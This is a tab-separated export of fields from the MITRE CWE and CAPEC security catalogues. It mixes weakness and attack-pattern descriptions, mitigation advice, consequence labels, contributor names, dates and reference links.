15084	104	1188
13188	62	updated Potential_Mitigations
19346	81	Confidentiality
11775	62	updated Potential_Mitigations
17819	39	2008-07-01
24522	56	ChildOf
17249	31	1000
14039	42	Prevention schemes mirror that of hard-coded password storage.
23123	101	CAPEC Content Team
25316	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
22990	89	Detailed
13000	62	updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors, Observed_Examples, References, Time_of_Introduction
17738	86	http://software-security.sans.org/blog/2010/03/18/top-25-series-rank-17-integer-overflow-or-wraparound
12283	28	CWE Content Team
16125	42	Developers should anticipate that section delimiters will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
9002	39	2009-07-27
24826	35	Cigital
24667	56	ChildOf
10496	92	Experiment
15317	74	2
22148	35	MITRE
13066	56	CanPrecede
18626	35	MITRE
9959	89	Standard
20619	57	Resultant
7117	62	updated References
20795	81	Availability
15780	42	Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing.
20299	80	Able to develop a malicious BIOS image with the original functionality as a normal BIOS image, but with added functionality that allows for later compromise and/or disruption.
12293	96	2009-03-03
20324	26	Architecture and Design
6778	73	If the transaction ID used to identify each query instance is randomized in some new DNS software, the attack must guess the transaction ID. Slow the response of the real DNS server by causing Denial-of-service. This gives adversaries enough time to guess transaction
20541	103	Primary
8582	71	2009
25196	104	669
16633	45	Variant
6077	62	updated Potential_Mitigations, Related_Attack_Patterns
19054	35	MITRE
11684	81	Integrity
23625	35	MITRE
25112	28	CWE Content Team
18737	28	CWE Content Team
7937	39	2012-10-30
7204	35	MITRE
19390	28	CWE Content Team
12482	69	Incomplete
9213	102	ChildOf
24594	21	PLOVER
11284	89	Standard
21982	27	The adversary must have a utility that can intercept and modify messages between the sender and recipient.
6862	28	Sean Eidemiller
12999	103	Primary
21863	28	CWE Content Team
9623	45	Base
5910	39	2017-05-03
15215	35	MITRE
6849	56	ChildOf
17700	39	2011-09-13
9182	97	Malicious Automated Software Update
7806	74	2
12076	68	This is not a complete solution, since many buffer overflows are not related to strings.
23662	79	Confidentiality
22195	69	Draft
15452	62	updated Potential_Mitigations
12416	28	CWE Content Team
25441	59	Updated Related_Attack_Patterns, Resources_Required
8424	39	2014-07-30
7023	45	Base
8715	48	06
23263	85	130
12934	62	updated Common_Consequences
5676	35	MITRE
15315	100	The MITRE Corporation
11123	21	CLASP
16625	101	CAPEC Content Team
21875	81	Other
12246	76	2018-07-31
7140	28	CWE Content Team
15196	50	Use web servers that employ a tight HTTP parsing process
15908	28	CWE Content Team
22229	62	updated Description, Other_Notes
9536	28	CWE Content Team
9734	100	The MITRE Corporation
6293	39	2008-08-01
15563	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
13983	31	1000
14763	56	ChildOf
20231	59	Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required
17042	63	Modify Application Data
24344	39	2017-11-08
24192	28	CWE Content Team
23524	59	Updated Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required
13281	104	453
14527	35	MITRE
8391	39	2017-11-08
17703	35	MITRE
18164	59	Updated Description Summary
17640	62	updated Relationships
19169	28	CWE Content Team
10370	70	Cross Frame Scripting
13275	39	2011-09-13
10398	39	2009-10-29
18847	23	A number or object is predictable based on observations that the attacker can make about the state of the system or network, such as time, process ID, etc.
15343	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships
11195	62	updated Relationships
22423	62	updated Relationships
11413	79	Access Control
9088	57	Indirect
10225	95	[Determine protection mechanism for opaque token] The attacker determines the protection mechanism used to protect the confidentiality and integrity of these data tokens. They may be obfuscated or a full blown encryption may be used.
20075	25	High
25240	55	CAPEC Content Team
6370	56	ChildOf
19942	63	Reduce Maintainability
6762	79	Authorization
13667	59	Updated Related_Attack_Patterns
6032	39	2010-02-16
9662	23	Cellular traffic for voice and data from mobile devices and retransmission devices can be intercepted via numerous methods. Malicious actors can deploy their own cellular tower equipment and intercept cellular traffic surreptitiously. Additionally, government agencies of adversaries and malicious actors can intercept cellular traffic via the telecommunications backbone over which mobile traffic is transmitted.
17511	39	2017-11-08
21359	42	Use sanity checks to reduce the timing window for exploitation of race conditions. This is only a partial solution, since many attacks might fail, but other attacks still might work within the narrower window, even accidentally.
24427	97	Buffer Overflow in an API Call
7548	102	ChildOf
5854	42	Avoid errors related to improper resource shutdown or release (CWE-404), which may leave the sensitive data within the resource if it is in an incomplete state.
10755	66	Dismantling an XML-Bomb
23363	26	Architecture and Design
15541	63	Bypass Protection Mechanism
12247	28	CWE Content Team
14110	39	2015-12-07
5943	39	2012-05-11
12928	88	Overly Restrictive Regular Expression
10870	35	MITRE
23239	78	Very Low
10789	33	Android Open Source Project
6143	28	CWE Content Team
7676	28	CWE Content Team
18420	39	2008-10-14
19190	28	CWE Content Team
11498	39	2009-12-28
8298	103	Primary
16893	100	The MITRE Corporation
18900	61	Draft
20696	28	CWE Content Team
11016	35	MITRE
15494	28	CWE Content Team
7995	45	Base
11172	50	Design: Use browser technologies that do not allow client side scripting.
25414	74	2
19313	46	.NET server applications can optionally execute using the identity of the user authenticated to the client. The intention of this functionality is to bypass authentication and access control checks within the .NET application code. Authentication is done by the underlying web server (Microsoft Internet Information Service IIS), which passes the authenticated token, or unauthenticated anonymous token, to the .NET application. Using the token to impersonate the client, the application then relies on the settings within the NTFS directories and files to control access. Impersonation enables the application, on the server running the .NET application, to both execute code and access resources in the context of the authenticated and authorized user.
17260	61	Stable
9674	35	MITRE
11399	104	653
9939	62	updated Potential_Mitigations, Time_of_Introduction
14806	62	updated Relationships
18516	39	2014-07-30
18819	45	Base
22847	39	2017-11-08
6945	86	http://projects.webappsec.org/w/page/13247003/XML%20External%20Entities
10466	102	ChildOf
20646	35	MITRE
25336	74	4
15752	76	2017-01-09
21038	62	updated Common_Consequences
25284	103	Primary
15631	39	2009-05-27
12498	39	2014-07-30
7235	35	MITRE
9313	92	Experiment
20160	81	Confidentiality
14385	61	Draft
19914	59	Updated Related_Attack_Patterns
24203	28	CWE Content Team
21799	61	Stable
25078	42	Avoid race conditions (CWE-362) during initialization routines.
23105	91	Architecture and Design
20337	28	CWE Content Team
6166	39	2012-05-11
7000	28	CWE Content Team
6955	35	MITRE
6906	39	2009-10-29
20862	62	updated Demonstrative_Examples, Taxonomy_Mappings
7515	21	PLOVER
23149	39	2019-01-03
24403	79	Authorization
12313	28	CWE Content Team
8072	55	CAPEC Content Team
14761	28	CWE Content Team
6741	39	2010-12-13
19846	31	1000
9358	101	CAPEC Content Team
8440	35	MITRE
7808	81	Other
20422	96	2013-06-24
18430	62	updated Potential_Mitigations
20252	35	MITRE
21366	36	http://ofirarkin.files.wordpress.com/2008/11/login.pdf
6798	42	Use only whitelists of acceptable variable or function names.
17783	28	CWE Content Team
20430	35	MITRE
17754	78	Medium
25147	91	Implementation
23996	103	Primary
18349	39	2017-05-03
12120	54	High
5712	44	Moderate
6105	62	updated Relationships, Taxonomy_Mappings
23756	62	updated Common_Consequences, References, Relationships
23673	28	CWE Content Team
8528	76	2019-09-30
6419	50	On the client side, the system's design could make it difficult to get access to the JSON object content via the script tag. Since the JSON object is never assigned locally to a variable, it cannot be readily modified by the attacker before being used by a script tag. For instance, if while(1) was added to the beginning of the JavaScript returned by the server, trying to access it with a script tag would result in an infinite loop. On the other hand, legitimate client side code can remove the while(1) statement after which the JavaScript can be evaluated. A similar result can be achieved by surrounding the returned JavaScript with comment tags, or using other similar techniques (e.g. wrapping the JavaScript with HTML tags).
9859	35	MITRE
16789	27	None: No specialized resources are required to execute this type of attack.
18675	21	7 Pernicious Kingdoms
8841	51	2014-06-23
6276	35	MITRE
22900	67	Low
7401	23	An adversary engages in fingerprinting activities to determine the type or version of an application installed on a remote target.
15233	100	The MITRE Corporation
14352	39	2008-09-08
10990	28	CWE Content Team
7876	95	[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.
12071	92	Experiment
20396	88	External Control of System or Configuration Setting
23248	78	Medium
21189	69	Incomplete
23042	78	High
9632	62	updated Modes_of_Introduction, References, Relationships
24628	62	updated Description, Name, Relationships
23782	42	If possible, configure your compiler so that it does not remove dead stores.
13732	42	Hard-code the search path to a set of known-safe values (such as system directories), or only allow them to be specified by the administrator in a configuration file. Do not allow these settings to be modified by an external party. Be careful to avoid related weaknesses such as CWE-426 and CWE-428.
10859	35	MITRE
10121	50	Implementation: Verify of authenticity of all session IDs at runtime.
19393	73	Develop malicious JavaScript that is injected from the rogue flash movie to the targeted flash application through vectors identified during the Experiment Phase and loaded by the victim's browser.
7090	86	http://www.ibm.com/developerworks/linux/library/l-reent.html
17889	104	567
18740	26	Implementation
19144	62	updated Relationships
9966	85	123
17824	28	Eric Dalci
13159	40	Advanced knowledge of software and hardware capabilities of a manufacturer's product.
14899	100	The MITRE Corporation
10557	100	The MITRE Corporation
21643	28	CWE Content Team
18120	77	Manual Static Analysis - Binary or Bytecode
12485	39	2013-07-17
8137	62	updated Time_of_Introduction
11997	62	updated Description, Other_Notes
18176	89	Detailed
21109	45	Variant
9757	28	CWE Content Team
8924	35	MITRE
11236	104	571
16746	81	Confidentiality
7278	26	Architecture and Design
21835	39	2011-06-27
21237	56	ChildOf
9475	26	Implementation
24401	66	Microsoft's Free Security Tools – banned.h
8221	46	A web application is expected to place restrictions on whether it is allowed to be rendered within frames, iframes, objects, embed or applet elements. Without the restrictions, users can be tricked into interacting with the application when they were not intending to.
23578	42	When utilizing pointer arithmetic to traverse a buffer, use a separate variable to track progress through memory and preserve the originally allocated address for later freeing.
17469	91	Architecture and Design
11761	39	2010-04-05
21158	28	CWE Content Team
7991	40	The channel on which the target communicates must be vulnerable to interception (e.g., man in the middle attack).
21612	102	PeerOf
10041	76	2017-08-04
17355	45	Variant
6697	45	Base
14600	26	System Configuration
14949	72	The software could consume excessive CPU cycles or memory using a URI that points to a large file, or a device that always returns data such as /dev/random. Alternately, the URI could reference a file that contains many nested or recursive entity references to further slow down parsing.
13450	56	ChildOf
5634	43	Simple
12812	28	CWE Content Team
14269	39	2008-07-01
19071	50	Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them
18410	100	The MITRE Corporation
21979	86	http://en.wikipedia.org/wiki/Cross-site_scripting
5864	39	2014-07-30
23813	28	CWE Content Team
24055	31	1000
18522	54	Medium
11131	28	CWE Content Team
16998	35	MITRE
7508	28	CWE Content Team
17249	103	Primary
10299	31	1000
19686	42	Run your program using system-provided resource limits for memory. This might still cause the program to crash or exit, but the impact to the rest of the system will be minimized.
7522	31	699
20042	36	http://www.securityfocus.com/infocus/1232
15084	23	The software initializes or sets a resource with a default that is intended to be changed by the administrator, but the default is not secure.
11001	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
15857	62	updated Name, Observed_Examples, Relationships, Type
10155	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
5802	43	Simple
7021	62	updated Potential_Mitigations
15380	75	Without visibility into the code, black box methods may not be able to sufficiently distinguish this weakness from others, requiring follow-up manual methods to diagnose the underlying problem.
9172	62	updated Time_of_Introduction
18098	35	MITRE
8048	31	699
7139	91	Implementation
6303	28	CWE Content Team
17829	53	The MITRE Corporation
10808	39	2008-10-14
16710	35	MITRE
7619	21	7 Pernicious Kingdoms
11900	72	Users could be locked out of accounts.
23015	79	Access Control
17255	35	MITRE
6926	72	If parsed, recursive entity references allow the attacker to expand data exponentially, quickly consuming all system resources.
16919	56	ChildOf
15657	28	CWE Content Team
17264	79	Confidentiality
23577	62	updated Description, Other_Notes
17209	79	Confidentiality
21839	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
21128	35	MITRE
13202	39	2011-06-01
17329	45	Base
6706	42	Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
9228	88	Insecure Temporary File
12105	101	CAPEC Content Team
19153	39	2015-12-07
23119	91	Architecture and Design
9678	54	Low
21422	30	Pete Lindstrom
7311	103	Primary
5756	74	5
8399	21	Anonymous Tool Vendor (under NDA)
18140	35	MITRE
16442	95	[Determine if timestamps are present.] The adversary sends a probe packet to the remote host to identify if timestamps are present.
17897	81	Availability
15590	59	Updated References
15540	23	A servlet error message indicates that there exists an unhandled exception in your web application code and may provide useful information to an attacker.
15169	62	updated Relationships
16319	62	updated Demonstrative_Examples, Observed_Examples, Potential_Mitigations
11107	28	CWE Content Team
12927	28	CWE Content Team
14227	35	MITRE
16695	35	MITRE
15104	69	Draft
24500	21	7 Pernicious Kingdoms
7338	104	602
15864	28	CWE Content Team
19656	62	updated Relationships, Taxonomy_Mappings
16402	39	2011-06-01
22325	39	2011-09-13
9769	45	Base
8936	39	2014-07-30
16921	39	2012-05-11
24794	39	2010-06-21
24252	21	PLOVER
16549	28	CWE Content Team
9448	63	Execute Unauthorized Code or Commands
11064	28	CWE Content Team
24701	62	updated Common_Consequences, Description, Relationships, Other_Notes, Taxonomy_Mappings
6827	101	CAPEC Content Team
19765	100	The MITRE Corporation
6264	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
13663	39	2010-12-13
9640	90	Java
19346	72	Sensitive data that is written to a swap file may be exposed.
15115	26	Implementation
16781	66	When scrubbing secrets in memory doesn't work
9386	28	CWE Content Team
5925	39	2014-07-30
23314	28	CWE Content Team
19383	35	MITRE
24651	33	Dan Boneh
6926	81	Availability
16552	28	CWE Content Team
10046	23	An attacker gets access to the database table where hashes of passwords are stored. He then uses a rainbow table of pre-computed hash chains to attempt to look up the original password. Once the original password corresponding to the hash is obtained, the attacker uses the original password to gain access to the system. A password rainbow table stores hash chains for various passwords. A password chain is computed, starting from the original password, P, via a reduce(compression) function R and a hash function H. A recurrence relation exists where Xi+1 = R(H(Xi)), X0 = P. Then the hash chain of length n for the original password P can be formed: X1, X2, X3, ... , Xn-2, Xn-1, Xn, H(Xn). P and H(Xn) are then stored together in the rainbow table. Constructing the rainbow tables takes a very long time and is computationally expensive. A separate table needs to be constructed for the various hash algorithms (e.g. SHA1, MD5, etc.). However, once a rainbow table is computed, it can be very effective in cracking the passwords that have been hashed without the use of salt.
14449	39	2008-08-15
6725	81	Integrity
8038	55	CAPEC Content Team
9202	63	Quality Degradation
23524	100	The MITRE Corporation
10214	44	High
21640	63	Read Application Data
16867	42	Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.                   This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.
8997	50	Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.
7629	86	http://www.hhs.gov/ocr/hipaa/
17664	91	Implementation
10391	35	MITRE
22014	50	Ensure that design documentation is saved in a secure location and has proper access controls set in place to avoid unnecessary modification.
25266	28	CWE Content Team
6031	36	http://en.wikipedia.org/wiki/DNS_rebinding
24162	39	2008-07-01
20692	73	Execute the software in a debugger and record API calls into the operating system or important libraries. This might occur in an environment other than a production environment, in order to find weaknesses that can be exploited in a production environment.
12224	28	CWE Content Team
12611	39	2011-06-01
14934	81	Access Control
7934	35	MITRE
21809	42	Periodically review the privileges and their owners.
21021	62	updated Relationships
16177	76	2019-09-30
24803	62	updated Relationships, Taxonomy_Mappings
14590	62	updated Relationships
7455	45	Variant
12737	35	MITRE
9601	35	MITRE
12811	50	Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.
19986	103	Primary
18059	47	Hide Activities
18334	39	2009-10-29
21199	33	Eric Rescorla
15044	35	MITRE
8061	74	2
22815	62	updated Potential_Mitigations
15941	63	DoS: Resource Consumption (CPU)
6883	28	CWE Content Team
15865	62	updated Potential_Mitigations
9477	74	1
7871	39	2019-06-20
18224	62	updated Common_Consequences
19348	28	Eric Dalci
9505	62	updated Potential_Mitigations, Related_Attack_Patterns
6287	91	Implementation
16500	39	2014-07-30
18798	31	699
25211	62	updated Relationships
14396	42	Consider storing the uploaded files outside of the web document root entirely. Then, use other mechanisms to deliver the files dynamically. [REF-423]
20862	28	CWE Content Team
16038	56	ChildOf
24643	40	The ability to monitor network communications.Access to at least one host, and the privileges to interface with the network interface card.
10791	31	699
16897	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction
10710	26	Implementation
16335	51	2014-06-23
23467	28	CWE Content Team
13783	74	3
18591	56	ChildOf
25110	42	Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client.
18509	49	2010
11224	80	These attacks generally require sophisticated machine learning techniques and require traffic capture as a prerequisite.
18337	62	updated Potential_Mitigations
7859	40	Configuration files must be modifiable by the attacker
17100	50	Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind.
20631	39	2012-05-11
6142	103	Primary
9160	56	ChildOf
10407	31	1000
14012	39	2008-07-01
18792	39	2017-11-08
7992	62	updated Other_Notes, Potential_Mitigations
20270	28	CWE Content Team
7807	103	Primary
23220	50	Monitor cellular RF interface to detect the usage of weaker-than-expected cellular encryption.
17338	39	2017-11-08
6019	28	CWE Content Team
20333	100	The MITRE Corporation
12444	100	The MITRE Corporation
7352	39	2008-09-08
15413	102	ChildOf
17125	104	360
20195	62	updated Relationships
6005	62	updated Relationships
12695	31	1000
23630	78	Low
9843	46	This issue can make the software perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.    While the interpetation of "large data table" and "excessively large number of indices" may vary for each product or developer, CISQ recommends a default threshold of 1000000 rows for a "large" table and a default threshold of 3 indices.
21985	62	updated Maintenance_Notes
16861	62	updated Relationships
22028	74	2
19123	50	Implementation: Perform output validation for all remote content.
16400	62	updated Name, Relationships
25004	46	Many file operations are intended to take place within a restricted directory. By using special elements such as ".." and "/" separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the "../" sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as "/usr/local/bin", which may also be useful in accessing unexpected files. This is referred to as absolute path traversal.             In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to widen the scope of attack. For example, the software may add ".txt" to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction.
24518	56	ChildOf
8885	62	updated Potential_Mitigations
24609	85	149
9247	39	2011-06-01
17582	28	CWE Content Team
19299	97	Signature Spoofing by Mixing Signed and Unsigned Content
14448	91	Architecture and Design
14165	35	MITRE
11853	28	CWE Content Team
24627	28	CWE Content Team
12556	28	CWE Content Team
7261	100	The MITRE Corporation
12847	35	MITRE
22422	97	Counterfeit Organizations
23318	42	Make the security mechanism as seamless as possible, while also providing the user with sufficient details when a security decision produces unexpected results.
22919	62	updated Relationships
12137	72	Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
11342	49	2005
21882	92	Explore
6608	23	Adversaries may attempt to obtain information about attached peripheral devices and components connected to a computer system. Examples may include discovering the presence of iOS devices by searching for backups, analyzing the Windows registry to determine what USB devices have been connected, or infecting a victim system with malware to report when a USB device has been connected. This may allow the adversary to gain additional insight about the system or network environment, which may be useful in constructing further attacks.
9524	62	updated Applicable_Platforms, Common_Consequences, Other_Notes, Relationship_Notes
24988	62	updated Demonstrative_Examples
8855	63	DoS: Resource Consumption (Other)
12480	91	System Configuration
17464	95	[Analyze and Understand Session IDs] The attacker finds that the targeted application use session credentials to identify legitimate users.
17362	62	updated Description, Relationships, Taxonomy_Mappings
6290	78	Low
16401	104	1173
24472	28	CWE Content Team
6851	81	Availability
25192	31	699
24198	39	2008-09-08
24836	35	MITRE
11856	35	MITRE
16713	55	CAPEC Content Team
23770	42	Pay close attention to complex conditionals that affect initialization, since some branches might not perform the initialization.
25129	63	Unexpected State
13102	42	Configure servers to use encrypted channels for communication, which may include SSL or other secure protocols.
24859	62	updated Demonstrative_Examples
10406	79	Confidentiality
11095	39	2008-07-01
8709	95	While communicating with the server, the attacker finds that she can control and override a variable consumed by the application server.
14724	81	Integrity
22146	47	Hide Activities
8583	79	Authorization
9310	62	updated Common_Consequences
13957	39	2010-04-05
9076	31	699
14145	92	Explore
20472	103	Primary
7179	28	CWE Content Team
15074	62	updated Demonstrative_Examples
23895	91	System Configuration
18612	90	Language-Independent
6539	62	updated Potential_Mitigations, Time_of_Introduction
17539	62	updated Relationships
15615	69	Draft
10482	88	Incorrect Behavior Order: Early Validation
19957	35	MITRE
18445	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Inter-application Flow Analysis                            Binary / Bytecode simple extractor – strings, ELF readers, etc.
19705	35	MITRE
21590	69	Incomplete
21436	56	ChildOf
12714	39	2017-11-08
18380	35	MITRE
19756	28	CWE Content Team
9550	35	MITRE
9686	43	Simple
7012	39	2011-06-01
25059	21	CLASP
20844	90	C#
18479	48	01
14849	102	CanPrecede
13971	35	MITRE
23494	43	Simple
20236	103	Primary
7746	35	MITRE
6087	28	CWE Content Team
18025	44	SOAR Partial
19882	97	Hacking Hardware
5650	62	updated Time_of_Introduction
10209	39	2017-11-08
8251	59	Updated Attack_Prerequisites, Description Summary, Related_Weaknesses
10799	28	CWE Content Team
17170	35	MITRE
5836	28	CWE Content Team
17260	40	The target application must accept input from the user and then use this input in the construction of commands to be executed. In virtually all cases, this is some form of string input that is concatenated to a constant string defined by the application to form the full command to be executed.
15082	28	CWE Content Team
10289	62	updated Relationships
19271	104	1113
12246	100	The MITRE Corporation
10012	88	Compiler Optimization Removal or Modification of Security-critical Code
12308	56	Requires
10890	39	2011-03-29
21147	88	Use of Hard-coded Cryptographic Key
7513	23	The software calls a function, procedure, or routine, but the caller specifies too many arguments, or too few arguments, which may lead to undefined behavior and resultant weaknesses.
7878	81	Other
11428	62	updated Relationships, Taxonomy_Mappings
9723	55	CAPEC Content Team
10291	56	ChildOf
16983	39	2014-07-30
23171	42	Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.
12271	62	updated Demonstrative_Examples
22625	35	MITRE
22577	90	Language-Independent
11172	89	Standard
22579	62	updated Demonstrative_Examples
11466	89	Detailed
6634	26	Implementation
5956	28	CWE Content Team
24201	35	MITRE
7178	62	updated Relationships, Taxonomy_Mappings
11529	28	CWE Content Team
13232	26	Implementation
9791	39	2011-03-29
12746	39	2014-07-30
11073	62	updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References
15168	35	MITRE
18829	28	Eric Dalci
12595	88	Improper Protection of Alternate Path
20634	28	Eric Dalci
14268	92	Explore
13837	28	CWE Content Team
23269	35	MITRE
18010	49	2007
13122	31	1003
9181	28	CWE Content Team
21935	62	updated Modes_of_Introduction, References, Relationships
23638	39	2014-06-23
25000	31	699
16131	28	CWE Content Team
21839	28	CWE Content Team
13967	94	If an adversary is able to inject data via a fault or side channel vulnerability towards malicious ends, the integrity of the application or information system will be compromised.
6184	62	updated Observed_Examples, Relationships
16727	73	Download files, modify files, or try to execute shell commands (with binary files).
13051	84	29
15652	42	The functionality of omitting a break statement could be clarified with an if statement. This method is much safer.
9128	35	MITRE
18710	39	2008-07-01
23181	28	Eric Dalci
7218	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
14635	39	2014-07-30
19446	35	MITRE
14429	79	Access Control
24775	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.
6501	35	MITRE
17889	88	Unsynchronized Access to Shared Data in a Multithreaded Context
19116	59	Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit
18683	60	28
13130	81	Other
5861	61	Draft
7831	35	MITRE
24969	42	Encrypt the code with a reliable encryption scheme before transmitting.                   This will only be a partial solution, since it will not detect DNS spoofing and it will not prevent your code from being modified on the hosting site.
13659	28	CWE Content Team
22025	28	CWE Content Team
18969	94	A successful schema poisoning attack can compromise the availability of the target system's service by exhausting its available resources.
8016	28	CWE Content Team
22063	28	CWE Content Team
9747	31	699
5994	39	2012-05-11
5584	47	Other
20859	39	2014-07-30
14365	85	528
7513	45	Variant
10553	62	updated Common_Consequences
13816	101	CAPEC Content Team
21512	81	Availability
19876	23	The product uses too much self-modifying      code.
19245	73	Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.
22321	39	2008-07-01
25106	62	updated Potential_Mitigations
25144	51	2014-06-23
15529	51	2014-06-23
25087	49	2010
23326	81	Other
15136	81	Confidentiality
7047	35	MITRE
17245	103	Primary
10455	35	MITRE
24150	31	699
13526	35	MITRE
18225	35	Veracode
20320	21	7 Pernicious Kingdoms
14421	28	CWE Content Team
17538	100	The MITRE Corporation
20813	49	2010
13355	45	Variant
10649	81	Access Control
12888	26	Architecture and Design
9759	62	updated Applicable_Platforms, Observed_Examples
13613	39	2009-01-12
20570	35	Cigital
19176	100	The MITRE Corporation
24780	104	1075
8584	76	2017-08-04
7582	28	CWE Content Team
10498	39	2008-07-01
11633	100	The MITRE Corporation
18016	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
17484	62	updated Name
11348	85	45
18770	39	2008-07-01
20205	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
19380	28	CWE Content Team
15164	39	2008-09-08
24741	35	MITRE
18250	56	ChildOf
13652	62	updated Potential_Mitigations
9406	35	MITRE
10893	39	2009-12-28
18063	39	2012-10-30
13442	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
18730	50	Do not provide the means for an attacker to determine success independently. This forces the attacker to check their guesses against an external authority, which can slow the attack and warn the defender. This mitigation may not be possible if testing material must appear externally, such as with a transmitted cryptotext.
7180	62	updated Relationships, Taxonomy_Mappings
24106	92	Experiment
24308	76	2018-07-31
20743	62	updated Relationships
11514	85	638
14469	35	MITRE
14075	63	DoS: Resource Consumption (Other)
17324	28	CWE Content Team
9596	35	MITRE
9626	78	High
9457	40	The adversary must have the ability to make HTTP requests to the target web application.
21773	35	MITRE
21094	39	2014-07-30
7400	39	2008-07-01
7437	81	Access Control
12399	35	MITRE
8663	63	Read Files or Directories
13452	39	2008-07-01
24422	39	2010-06-21
5784	50	Leverage anti-virus products to detect and quarantine software with known virus.
13115	31	1000
14916	28	CWE Content Team
10383	26	Implementation
18361	28	CWE Content Team
17276	33	Steve Christey
7393	90	C++
24754	62	updated Relationships
5779	104	1049
21221	74	3
17939	39	2009-03-10
20793	28	CWE Content Team
10563	35	MITRE
16016	103	Primary
22070	62	updated Related_Attack_Patterns, Relationships
24274	62	updated Related_Attack_Patterns, Relationships
14304	35	MITRE
12107	103	Primary
12835	21	CLASP
14553	77	Automated Static Analysis - Source Code
17437	47	Unreliable Execution
10414	35	MITRE
15058	103	Primary
22658	39	2011-06-01
23603	28	CWE Content Team
8767	35	MITRE
16741	21	PLOVER
17905	39	2012-10-30
22475	26	Implementation
18881	66	XSS Defense HOWTO
9023	56	ChildOf
7497	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
9542	28	Sean Eidemiller
19075	35	MITRE
12251	63	Read Files or Directories
18517	35	MITRE
11503	79	Availability
13447	89	Standard
22413	51	2018-05-31
11348	50	Use a language or compiler that performs automatic bounds checking.
7550	101	CAPEC Content Team
6689	39	2014-07-30
13339	100	The MITRE Corporation
6743	23	An adversary may execute a flooding attack using the SSL protocol with the intent to deny legitimate users access to a service by consuming all the available resources on the server side. These attacks take advantage of the asymmetric relationship between the processing power used by the client and the processing power used by the server to create a secure connection. In this manner the attacker can make a large number of HTTPS requests on a low provisioned machine to tie up a disproportionately large number of resources on the server. The clients then continue to keep renegotiating the SSL connection. When multiplied by a large number of attacking machines, this attack can result in a crash or loss of service to legitimate users.
